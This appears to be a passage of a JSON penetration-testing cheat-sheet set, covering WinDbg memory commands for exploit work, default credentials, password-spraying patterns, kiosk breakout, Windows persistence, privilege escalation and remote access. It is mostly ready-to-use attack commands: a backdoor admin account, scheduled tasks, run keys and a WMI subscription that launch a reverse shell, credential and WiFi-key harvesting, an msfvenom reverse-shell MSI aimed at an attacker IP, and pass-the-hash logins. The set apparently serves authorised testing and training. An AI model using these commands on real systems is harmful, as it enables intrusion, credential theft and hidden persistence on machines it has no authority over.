            "code": "db <Address> L<Count>       ; Display Count bytes\ndd esp L10                  ; Display 10 dwords at ESP\ndb poi(esp) L20             ; Display 20 bytes at address pointed by ESP"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Specify how much memory to display."
          }
        ]
      },
      {
        "title": "Display Memory at Register",
        "codes": [
          {
            "lang": "text",
            "code": "dd esp                      ; View stack top\ndd ebp                      ; View stack frame\ndb eax                      ; View bytes at EAX\ndd poi(ebp+8)               ; Dereference pointer at EBP+8"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common patterns for examining stack and registers."
          }
        ]
      },
      {
        "title": "Dump Structures",
        "codes": [
          {
            "lang": "text",
            "code": "dt ntdll!_TEB               ; Display TEB structure definition\ndt ntdll!_TEB @$teb         ; Display TEB for current thread\ndt ntdll!_PEB @$peb         ; Display PEB for current process\ndt ntdll!_LDR_DATA_TABLE_ENTRY <Address>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Display known Windows structures."
          }
        ]
      },
      {
        "title": "List Structure Fields",
        "codes": [
          {
            "lang": "text",
            "code": "dt ntdll!_PEB @$peb Ldr                    ; Show only Ldr field\ndt ntdll!_PEB @$peb Ldr.InMemoryOrderModuleList"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View specific structure members."
          }
        ]
      },
      {
        "title": "Write to Memory",
        "codes": [
          {
            "lang": "text",
            "code": "eb <Address> <Bytes>        ; Edit bytes\new <Address> <Words>        ; Edit words\ned <Address> <Dwords>       ; Edit dwords\nea <Address> \"<String>\"     ; Edit ASCII string\neu <Address> \"<String>\"     ; Edit Unicode string"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Modify memory contents during debugging."
          }
        ]
      },
      {
        "title": "Write Examples",
        "codes": [
          {
            "lang": "text",
            "code": "eb eip 90 90 90 90          ; Write NOPs at EIP\ned esp 41414141             ; Write AAAA at ESP\nea 0x00401000 \"test\"        ; Write string at address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common memory modification patterns."
          }
        ]
      },
      {
        "title": "Search Memory",
        "codes": [
          {
            "lang": "text",
            "code": "s -b <Start> L<Length> <Pattern>   ; Search bytes\ns -a <Start> L<Length> \"string\"    ; Search ASCII\ns -u <Start> L<Length> \"string\"    ; Search Unicode\ns -d <Start> L<Length> <Dword>     ; Search dword"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find patterns in the memory space."
          }
        ]
      },
      {
        "title": "Search Examples",
        "codes": [
          {
            "lang": "text",
            "code": "s -a 0 L?80000000 \"password\"       ; Search all memory for ASCII\ns -b esp L1000 41 42 43 44         ; Search stack for ABCD\ns -d 0x10000000 L?10000000 0xffe4  ; Search for JMP ESP opcode bytes"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common search operations."
          }
        ]
      },
      {
        "title": "Search for Instructions",
        "codes": [
          {
            "lang": "text",
            "code": "# <Address> L<Length> <Pattern>    ; Search for instruction pattern\n# 0x10000000 L1000 jmp esp         ; Find JMP ESP instruction"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find specific opcodes in memory."
          }
        ]
      },
      {
        "title": "Memory Protection",
        "codes": [
          {
            "lang": "text",
            "code": "!vprot <Address>            ; Display virtual memory protection\n!address <Address>          ; Display detailed address info\n!address -summary           ; Memory summary"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check memory page protections."
          }
        ]
      },
      {
        "title": "Pointer Dereferencing",
        "codes": [
          {
            "lang": "text",
            "code": "dd poi(esp)                 ; Display dword at address stored in ESP\ndd poi(poi(esp))            ; Double dereference\ndb poi(ebp+8) L10           ; Display bytes at first argument"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use poi() to dereference pointers."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "WinDbg Commands",
        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/commands"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Memory inspection and manipulation commands for exploit development and analysis."
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Windows Defaults",
    "tags": [],
    "steps": [
      {
        "title": "Local Administrator",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Administrator:password\nAdministrator:Password1\nAdministrator:P@ssw0rd\nAdministrator:admin\nAdministrator:(blank)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Windows Accounts",
        "codes": [
          {
            "lang": "plaintext",
            "code": "admin:password\nadmin:admin\nguest:(blank)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Active Directory",
        "codes": [
          {
            "lang": "plaintext",
            "code": "administrator:Password123\nadministrator:Welcome1\nadministrator:P@ssw0rd\nadministrator:Company123"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Windows Help Escape",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Help Application Tricks",
        "codes": [
          {
            "lang": "text",
            "code": "# In help search\nmk:@MSITStore:C:\\Windows\\Help\\iexplore.chm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Help often allows hyperlinks that can execute programs.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "CHM File Execution",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If can create/access CHM file, can embed command execution.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Important File Locations",
    "title": "Windows Important Locations",
    "tags": [],
    "steps": [
      {
        "title": "Registry and User Data",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Users/Administrator/NTUser.dat\nC:/Documents and Settings/Administrator/NTUser.dat"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Web Server Configurations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/apache/logs/access.log\nC:/apache/logs/error.log\nC:/apache/php/php.ini\nC:/inetpub/wwwroot/global.asa"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Apache Configurations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Program Files/Apache Group/Apache2/conf/httpd.conf\nC:/Program Files/Apache Group/Apache/conf/httpd.conf\nC:/Program Files/Apache Group/Apache/logs/access.log\nC:/Program Files/Apache Group/Apache/logs/error.log\nC:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf\nC:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf\nC:/Program Files (x86)/xampp/apache/conf/httpd.conf"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MySQL Configurations and Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/MySQL/data/hostname.err\nC:/MySQL/data/mysql.err\nC:/MySQL/data/mysql.log\nC:/MySQL/my.cnf\nC:/MySQL/my.ini\nC:/Program Files/MySQL/data/hostname.err\nC:/Program Files/MySQL/data/mysql-bin.log\nC:/Program Files/MySQL/data/mysql.err\nC:/Program Files/MySQL/data/mysql.log\nC:/Program Files/MySQL/my.ini\nC:/Program Files/MySQL/my.cnf\nC:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err\nC:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log\nC:/Program Files/MySQL/MySQL Server 5.0/my.cnf\nC:/Program Files/MySQL/MySQL Server 5.1/my.ini"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PHP Configurations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/php4/php.ini\nC:/php5/php.ini\nC:/php/php.ini\nC:/WINDOWS/php.ini\nC:/WINNT/php.ini\nC:/xampp/apache/bin/php.ini"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "FTP Server Configurations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Program Files/FileZilla Server/FileZilla Server.xml\nC:/Program Files (x86)/FileZilla Server/FileZilla Server.xml"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows System Files",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/boot.ini\nC:/WINDOWS/Repair/SAM\nC:/Windows/repair/system\nC:/Windows/repair/software\nC:/Windows/repair/security\nC:/WINDOWS/System32/drivers/etc/hosts\nC:/Windows/win.ini\nC:/WINNT/win.ini"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows Setup and Installation Files",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Windows/Panther/Unattend/Unattended.xml\nC:/Windows/Panther/Unattended.xml\nC:/Windows/debug/NetSetup.log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows Event Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Windows/system32/config/AppEvent.Evt\nC:/Windows/system32/config/SecEvent.Evt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Registry Backups",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Windows/system32/config/default.sav\nC:/Windows/system32/config/security.sav\nC:/Windows/system32/config/software.sav\nC:/Windows/system32/config/system.sav\nC:/Windows/system32/config/regback/default\nC:/Windows/system32/config/regback/sam\nC:/Windows/system32/config/regback/security\nC:/Windows/system32/config/regback/system\nC:/Windows/system32/config/regback/software"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "IIS Configurations and Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml\nC:/Windows/System32/inetsrv/config/applicationHost.config\nC:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "XAMPP Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "C:/xampp/apache/logs/access.log\nC:/xampp/apache/logs/error.log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Windows Kiosk Breakout Techniques",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Common Kiosk Types",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Assigned Access** - Single-app kiosk (Windows 10/11)\n- **Shell Launcher** - Custom shell replacement\n- **Browser Kiosk** - IE/Edge in kiosk mode\n- **Third-Party** - Various kiosk software"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Windows Kiosk Configuration",
        "url": "https://learn.microsoft.com/en-us/windows/configuration/assigned-access/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Windows kiosk modes restrict users to specific applications. Goal is to escape to command execution.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Password Spraying",
    "title": "Windows Password Spraying",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [],
    "resources": [
      {
        "text": "HackTricks Password Spraying",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**What you're looking for:**\n- Valid credential pairs\n- Users with weak/default passwords\n- Seasonal passwords (Company2024!, Winter2024!)",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Common password patterns to try:**\n- *Season + Year*: Spring2024!, Winter2024!, Summer2024!, Fall2024!\n- *Month + Year*: January2024!, December2024!\n- *Company + Numbers*: CompanyName1!, CompanyName123!\n- *Keyboard patterns*: Qwerty123!, Password1!\n- *Default/Lazy*: Welcome1!, Changeme1!, P@ssw0rd!",
        "variant": "tip"
      },
      {
        "type": "note",
        "content": "Spray behavior:\n- **Without `--no-bruteforce` (default behavior):** Every username is tried with every password (cartesian product)\n- **With `--no-bruteforce`:** Usernames and passwords are paired line-by-line (1:1 mapping)",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Windows Persistence",
    "title": "Windows Persistence",
    "tags": [
      "Persistence",
      "Windows"
    ],
    "steps": [
      {
        "title": "Create Local Admin Account",
        "codes": [
          {
            "lang": "bash",
            "code": "net user backdoor Password123! /add\nnet localgroup Administrators backdoor /add\nnet localgroup \"Remote Desktop Users\" backdoor /add"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enable RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Scheduled Task",
        "codes": [
          {
            "lang": "bash",
            "code": "schtasks /create /tn \"Updater\" /tr \"C:\\temp\\reverse.exe\" /sc onlogon /ru SYSTEM"
          },
          {
            "lang": "bash",
            "code": "# Run at specific time\nschtasks /create /tn \"Updater\" /tr \"C:\\temp\\reverse.exe\" /sc daily /st 09:00 /ru SYSTEM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Registry Run Key",
        "codes": [
          {
            "lang": "bash",
            "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\temp\\reverse.exe\" /f"
          },
          {
            "lang": "bash",
            "code": "# Current user only\nreg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\temp\\reverse.exe\" /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Startup Folder",
        "codes": [
          {
            "lang": "bash",
            "code": "copy reverse.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "WMI Event Subscription",
        "codes": [
          {
            "lang": "powershell",
            "code": "$FilterArgs = @{\n    Name = 'UpdateFilter'\n    EventNamespace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9\"\n}\n$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{\n    Name = 'UpdateConsumer'\n    CommandLineTemplate = 'C:\\temp\\reverse.exe'\n}\n$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$BindingArgs = @{\n    Filter = [Ref]$Filter\n    Consumer = [Ref]$Consumer\n}\nNew-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Survives reboots, harder to detect.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Persistence",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/persistence"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Maintain access to compromised system. Use sparingly - only if connection may be lost.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Windows Privilege Escalation",
    "title": "Windows Privilege Escalation",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Current User Info",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami\nwhoami /priv\nwhoami /groups"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "System Information",
        "codes": [
          {
            "lang": "bash",
            "code": "systeminfo\nhostname"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Network Information",
        "codes": [
          {
            "lang": "bash",
            "code": "ipconfig /all\nroute print\nnetstat -ano"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Users and Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "net user\nnet user <Username>\nnet localgroup\nnet localgroup administrators"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Running Processes",
        "codes": [
          {
            "lang": "bash",
            "code": "tasklist /SVC"
          },
          {
            "lang": "powershell",
            "code": "Get-Process"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Sensitive Information Discovery",
        "substeps": [
          {
            "title": "Search for Passwords in Files",
            "codes": [
              {
                "lang": "bash",
                "code": "findstr /si password *.txt *.ini *.config *.xml"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell History",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-History\n(Get-PSReadlineOption).HistorySavePath\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Saved Credentials",
            "codes": [
              {
                "lang": "bash",
                "code": "cmdkey /list"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Registry Autologon",
            "codes": [
              {
                "lang": "bash",
                "code": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "WiFi Passwords",
            "codes": [
              {
                "lang": "bash",
                "code": "netsh wlan show profiles\nnetsh wlan show profile <SSID> key=clear"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Automated Enumeration Tools",
        "substeps": [
          {
            "title": "WinPEAS",
            "codes": [
              {
                "lang": "bash",
                "code": "winpeas.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerUp",
            "codes": [
              {
                "lang": "powershell",
                "code": "Import-Module .\\PowerUp.ps1\nInvoke-AllChecks"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Seatbelt",
            "codes": [
              {
                "lang": "bash",
                "code": "Seatbelt.exe -group=all"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Service Exploitation",
        "substeps": [
          {
            "title": "List Services",
            "codes": [
              {
                "lang": "bash",
                "code": "sc query state=all"
              },
              {
                "lang": "powershell",
                "code": "Get-Service"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Service Binary Permissions",
            "codes": [
              {
                "lang": "bash",
                "code": "icacls \"<ServiceBinaryPath>\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Check if current user can modify service executable.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Unquoted Service Path",
            "codes": [
              {
                "lang": "bash",
                "code": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "If path contains spaces and isn't quoted, Windows searches each directory.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Modify Service Binary Path",
            "codes": [
              {
                "lang": "bash",
                "code": "sc config <ServiceName> binpath=\"C:\\path\\to\\payload.exe\"\nsc stop <ServiceName>\nsc start <ServiceName>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Restart Service",
            "codes": [
              {
                "lang": "bash",
                "code": "net stop <ServiceName>\nnet start <ServiceName>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scheduled Tasks",
            "codes": [
              {
                "lang": "bash",
                "code": "schtasks /query /fo LIST /v"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Misconfigured services are a common privilege escalation vector.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Privilege Abuse",
        "substeps": [
          {
            "title": "Token Impersonation (SeImpersonatePrivilege)",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "If enabled, can impersonate tokens. Use **PrintSpoofer**, **JuicyPotato**, or similar.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Check Privileges",
            "codes": [
              {
                "lang": "bash",
                "code": "whoami /priv"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PrintSpoofer",
            "codes": [
              {
                "lang": "bash",
                "code": "PrintSpoofer.exe -i -c \"cmd.exe\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "AlwaysInstallElevated",
            "codes": [
              {
                "lang": "bash",
                "code": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Generate MSI Payload",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f msi > shell.msi"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Execute MSI",
            "codes": [
              {
                "lang": "bash",
                "code": "msiexec /quiet /qn /i shell.msi"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Kernel Exploits",
            "codes": [
              {
                "lang": "bash",
                "code": "wmic qfe get Caption,Description,HotFixID,InstalledOn"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Search Exploit-DB",
            "codes": [
              {
                "lang": "bash",
                "code": "searchsploit windows local privilege escalation"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Exploit enabled privileges and misconfigurations.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Windows Privilege Escalation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "First step after initial foothold. Gather system info, user context, and potential attack vectors.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Windows Privilege Escalation Checks",
    "title": "Windows Privilege Escalation Checks",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Manual Checks",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami /all"
          },
          {
            "lang": "bash",
            "code": "systeminfo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "PrivescCheck - Basic",
        "codes": [
          {
            "lang": "powershell",
            "code": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "PrivescCheck - Extended",
        "codes": [
          {
            "lang": "powershell",
            "code": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "PrivescCheck - All Checks",
        "codes": [
          {
            "lang": "powershell",
            "code": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Copy report back to host machine for review.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "PrivescCheck GitHub",
        "url": "https://github.com/itm4n/PrivescCheck"
      }
    ],
    "foundational": true
  },
  {
    "category": "Windows Remote Access",
    "title": "Windows Remote Access",
    "tags": [
      "Windows"
    ],
    "steps": [
      {
        "title": "RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp3 /u:<Username> /p:'<Password>' /v:<TargetIP> /dynamic-resolution +clipboard /cert:ignore"
          },
          {
            "lang": "bash",
            "code": "# With domain\nxfreerdp3 /u:<Username> /p:'<Password>' /d:<Domain> /v:<TargetIP> /dynamic-resolution +clipboard /cert:ignore"
          },
          {
            "lang": "bash",
            "code": "# Pass the hash (requires Restricted Admin mode enabled)\nxfreerdp3 /u:<Username> /pth:<NTLMHash> /v:<TargetIP> /dynamic-resolution +clipboard /cert:ignore"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "GUI access. Best for manual enumeration and when you need to interact with GUI apps.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "WinRM / Evil-WinRM",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>'"
          },
          {
            "lang": "bash",
            "code": "# With domain\nevil-winrm -i <TargetIP> -u <Username> -p '<Password>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Pass the hash\nevil-winrm -i <TargetIP> -u <Username> -H <NTLMHash>"
          },
          {
            "lang": "bash",
            "code": "# With SSL (port 5986)\nevil-winrm -i <TargetIP> -u <Username> -p '<Password>' -S"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "PowerShell remoting. Port 5985 (HTTP) or 5986 (HTTPS).",
            "variant": "info"
          }
        ]
      },
      {
        "title": "PSExec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<Username>:'<Password>'@<TargetIP>"
          },
          {
            "lang": "bash",
            "code": "# Pass the hash\nimpacket-psexec -hashes :<NTLMHash> <Domain>/<Username>@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires admin credentials and SMB access (port 445).",
            "variant": "important"
          }
        ]
      },
      {
        "title": "WMI",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-wmiexec <Domain>/<Username>:'<Password>'@<TargetIP>"
          },
          {
            "lang": "bash",
            "code": "# Pass the hash\nimpacket-wmiexec -hashes :<NTLMHash> <Domain>/<Username>@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Windows Management Instrumentation. Requires admin credentials.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "SSH",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh <Username>@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If OpenSSH is installed on target.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Reverse Shell Listener",
        "substeps": [
          {
            "title": "Penelope",
            "codes": [
              {
                "lang": "bash",
                "code": "penelope <PORT>"
              },
              {
                "lang": "bash",
                "code": "# Multiple listeners\npenelope 4444 5555 6666"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Feature-rich shell handler with auto-upgrade, logging, and tab completion.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "codes": [
          {
            "lang": "bash",
            "code": "nc -lvnp <PORT>"
          },
          {
